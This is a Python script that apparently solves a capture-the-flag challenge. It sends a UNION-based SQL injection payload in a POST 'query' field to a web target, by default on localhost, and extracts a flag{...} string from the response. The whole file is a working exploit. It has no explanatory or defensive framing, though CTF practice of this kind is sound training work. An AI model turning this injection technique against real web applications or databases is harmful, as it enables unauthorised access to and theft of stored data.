import sys
import re
import urllib.request
import urllib.parse

def main():
    # Default local testing URL
    target = "http://localhost:9090"
    if len(sys.argv) > 1:
        target = sys.argv[1]
        
    print(f"[*] Target URL: {target}")
    
    # UNION SQL injection payload
    payload = "a' UNION SELECT flag, 'placeholder' FROM flag_store--"
    
    # URL encode the POST payload
    data = urllib.parse.urlencode({'query': payload}).encode('utf-8')
    req = urllib.request.Request(target, data=data, method='POST')
    
    print("[*] Sending SQL Injection payload...")
    try:
        with urllib.request.urlopen(req) as response:
            html = response.read().decode('utf-8')
            
            # Find flag matching the standard pattern flag{...}
            flag_match = re.search(r"flag\{[a-zA-Z0-9_\-]+\}", html)
            if flag_match:
                print(f"[+] Exploit successful!")
                print(f"[+] Recovered Flag: {flag_match.group(0)}")
                sys.exit(0)
            else:
                print("[-] Target page loaded but no flag matching the pattern 'flag{...}' was found.")
                sys.exit(1)
    except Exception as e:
        print(f"[-] Connection or request failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
